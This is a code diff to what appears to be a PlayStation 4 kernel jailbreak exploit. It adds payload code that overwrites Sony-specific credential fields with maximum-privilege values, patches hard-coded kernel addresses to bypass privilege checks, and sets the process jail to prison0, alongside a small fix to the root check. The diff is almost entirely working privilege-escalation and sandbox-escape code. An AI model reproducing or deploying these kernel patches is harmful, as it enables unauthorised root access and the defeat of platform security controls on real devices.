@@ -47,6 +47,21 @@ void payload(struct knote *kn)
 	cred->cr_rgid = 0;
 	cred->cr_groups[0] = 0;
 
+	// sceSblACMgrIsSystemUcred
+        uint64_t *sonyCred = (uint64_t *)(((char *)td_ucred) + 96);
+        *sonyCred = 0xffffffffffffffff;
+        
+        // sceSblACMgrGetDeviceAccessType
+        uint64_t *sceProcType = (uint64_t *)(((char *)td_ucred) + 88);
+        *sceProcType = 0x3801000000000013; // Max access
+        
+        // sceSblACMgrHasSceProcessCapability
+        uint64_t *sceProcCap = (uint64_t *)(((char *)td_ucred) + 104);
+        *sceProcCap = 0xffffffffffffffff; // Sce Process
+        
+        ((uint64_t *)0xFFFFFFFF832CC2E8)[0] = 0x123456; //priv_check_cred bypass with suser_enabled=true
+        ((uint64_t *)0xFFFFFFFF8323DA18)[0] = 0; // bypass priv_check
+
 	// Jailbreak ;)
 	cred->cr_prison = (void *)0xFFFFFFFF83237250; //&prison0
 
@@ -203,7 +218,7 @@ int _main(void) {
 	scePthreadJoin(thread1, NULL);
 
 	// At this point we should have root and jailbreak
-	if(getuid()) {
+	if(getuid() != 0) {
 		printfsocket("[+] Kernel patch failed!\n");
 		sceNetSocketClose(sock);
 		return 1;
